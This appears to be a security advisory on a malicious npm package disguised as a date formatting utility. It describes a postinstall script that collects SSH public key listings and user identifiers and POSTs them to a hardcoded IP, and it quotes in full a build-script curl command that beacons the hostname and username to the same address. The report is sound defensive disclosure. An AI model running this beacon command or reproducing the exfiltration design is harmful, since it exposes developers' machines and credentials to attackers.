summary: Malicious package exfiltrates SSH key listings and host identifiers to hardcoded C2 IP
details: Package advertises itself as 'A simple date formatting utility' but ships two attacker components beyond the trivial 7-line formatDate export. postinstall.js reads ~/.ssh on the installer's machine, enumerates.pub files, collects os.userInfo() identifiers, and POSTs the result over HTTPS to the hardcoded bare-IP destination 124.221.154.135:443/post. package.json's `scripts.build` entry runs `curl http://124.221.154.135/pre?h=$(hostname)&u=$(whoami)`, beaconing the installer's hostname and username over plain HTTP to the same IP. The cover story (date utility, ISC license, empty author field) is inconsistent with the shipped SSH-key exfil code and bare-IP beacon, and the two attacker components reuse the same hardcoded C2 endpoint. Although the postinstall.js file is not currently wired to an npm lifecycle script, it is named and staged for install-time execution, and the build-script beacon fires whenever `npm run build` is invoked.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
